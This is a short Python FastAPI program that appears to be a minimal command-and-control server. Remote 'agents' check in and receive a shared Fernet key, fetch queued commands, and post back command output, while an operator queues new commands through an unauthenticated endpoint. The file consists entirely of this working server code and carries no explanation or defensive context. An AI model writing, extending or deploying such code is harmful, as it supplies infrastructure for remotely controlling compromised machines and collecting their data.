from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from cryptography.fernet import Fernet
import uuid, time, uvicorn

app = FastAPI()
KEY = Fernet.generate_key()
cipher = Fernet(KEY)
agents = {}

class CheckIn(BaseModel): id: str = ""
class Task(BaseModel): cmd: str
class Result(BaseModel): cmd: str; out: str

@app.post("/checkin")
def checkin(p: CheckIn):
    aid = p.id or str(uuid.uuid4())
    agents.setdefault(aid, {"last": time.time(), "tasks": [], "results": []})
    return {"key": KEY.decode(), "id": aid}

@app.get("/tasks/{aid}")
def get_tasks(aid: str):
    if aid not in agents: raise HTTPException(404, "Not found")
    t = agents[aid]["tasks"]; agents[aid]["tasks"] = []
    return t

@app.post("/push/{aid}")
def push(aid: str, t: Task):
    if aid not in agents: raise HTTPException(404, "Not found")
    agents[aid]["tasks"].append(t.cmd)
    return {"status": "queued"}

@app.post("/result/{aid}")
def result(aid: str, r: Result):
    agents.setdefault(aid, {"results": []})["results"].append(r.dict())
    return {"logged": True}

if __name__ == "__main__":
    print(f"[+] KEY: {KEY.decode()}")
    uvicorn.run(app, host="0.0.0.0", port=8000)
